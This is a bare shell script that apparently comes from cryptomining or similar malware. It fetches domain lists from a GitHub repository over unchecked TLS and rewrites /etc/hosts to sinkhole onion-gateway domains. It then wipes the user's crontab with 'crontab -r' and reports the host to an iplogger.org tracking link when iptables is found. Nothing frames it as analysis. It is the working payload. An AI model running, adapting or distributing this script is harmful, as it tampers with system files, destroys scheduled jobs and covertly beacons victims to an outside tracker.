c=$(wget --no-check-certificate -O - -q https://raw.githubusercontent.com/zoalsharf/rig/master/gateway || curl --insecure -s https://raw.githubusercontent.com/zoalsharf/rig/master/gateway)
d=$(wget --no-check-certificate -O - -q https://raw.githubusercontent.com/zoalsharf/rig/master/dns || curl --insecure -s https://raw.githubusercontent.com/zoalsharf/rig/master/dns)
s=$(command -v iptables|wc -l)

del1 () {
        for i in ${c[@]}; do
        sed -i '/'$1$i'/d' /etc/hosts
        done
}

del2 () {
        for i in ${d[@]}; do
        sed -i '/'$i'/d' /etc/hosts
        done
}

chekhosts () {
        for i in ${c[@]}; do
        sed -i '1 i\127.0.0.1       '$1$i'' /etc/hosts
        done
}

host () {
        for i in ${d[@]}; do
        sed -i '1 i\127.0.0.1       '$i'' /etc/hosts
        done
}




del1 'nssnkct6udyyx6zlv4l6jhqr5jdf643shyerk246fs27ksrdehl2z3qd.'
sleep 1
del1 'ojk5zra7b3yq32timb27n4qj5udk4w2l5kqn5ulhnugdscelttfhtoyd.'
sleep 1
del1 'dreambusweduybcp.'
sleep 2
del2
sleep 3
chekhosts 'nssnkct6udyyx6zlv4l6jhqr5jdf643shyerk246fs27ksrdehl2z3qd.'
sleep 2
chekhosts 'ojk5zra7b3yq32timb27n4qj5udk4w2l5kqn5ulhnugdscelttfhtoyd.'
sleep 3
chekhosts 'dreambusweduybcp.'                                                                                                                                                                 sleep 3
sleep 4
host

crontab -r

if [ $s -eq "1" ]; then
        curl -A Iptables-found/1.9 -s https://iplogger.org/389LB3
else
        exit
fi
